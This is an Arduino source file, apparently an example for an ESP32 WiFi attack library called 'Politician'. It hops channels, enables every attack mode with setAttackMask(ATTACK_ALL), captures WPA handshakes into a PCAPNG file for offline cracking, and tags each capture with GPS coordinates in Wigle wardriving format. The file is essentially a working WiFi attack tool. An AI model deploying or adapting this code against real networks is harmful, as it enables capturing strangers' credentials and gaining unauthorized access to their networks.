#include <Arduino.h>
#include <SD.h>
#include <SPI.h>
#include <Politician.h>
#include <PoliticianStorage.h>

using namespace politician;
using namespace politician::storage;

Politician engine;
const int SD_CS_PIN = 5;

// Fake GPS data for simulation purposes
float current_lat = 40.7128;
float current_lon = -74.0060;

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("\n[!] HANDSHAKE CAPTURED: %s\n", rec.ssid);

    // 1. Write the Handshake to our PCAPNG file
    if (PcapngFileLogger::append(SD, "/captures.pcapng", rec)) {
        Serial.println("  -> Written PCAPNG Record.");
    }

    // 2. Automatically log the coordinates to Wigle.net CSV format
    if (WigleCsvLogger::append(SD, "/wardrive.csv", rec, current_lat, current_lon)) {
        Serial.println("  -> Logged GPS Coordinates to Wigle CSV.");
    } else {
        Serial.println("  -> Failed to log Wigle CSV.");
    }
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n--- Politician Wigle.net GPS Integration Exampe ---");

    if(!SD.begin(SD_CS_PIN)){
        Serial.println("SD Card Mount Failed! Ensure it is connected.");
    }

    // Setup Engine Callbacks
    engine.setEapolCallback(onHandshake);

    Config cfg;
    // We strictly only care about High-Value Handshakes to conserve GPS logging space
    cfg.capture_filter = LOG_FILTER_HANDSHAKES; 
    
    if (engine.begin(cfg) != politician::OK) {
        Serial.println("WiFi Init Failed!");
        while(1) delay(100);
    }
    
    engine.startHopping();
    engine.setActive(true);
    engine.setAttackMask(ATTACK_ALL);

    Serial.println("Wigle Wardriving started...");
}

void loop() {
    engine.tick();
    
    // Simulate updating GPS coordinates dynamically (e.g. from TinyGPS++ library)
    current_lat += 0.0001; 
    current_lon += 0.0001;
    delay(10); // Throttle loop for simulation
}
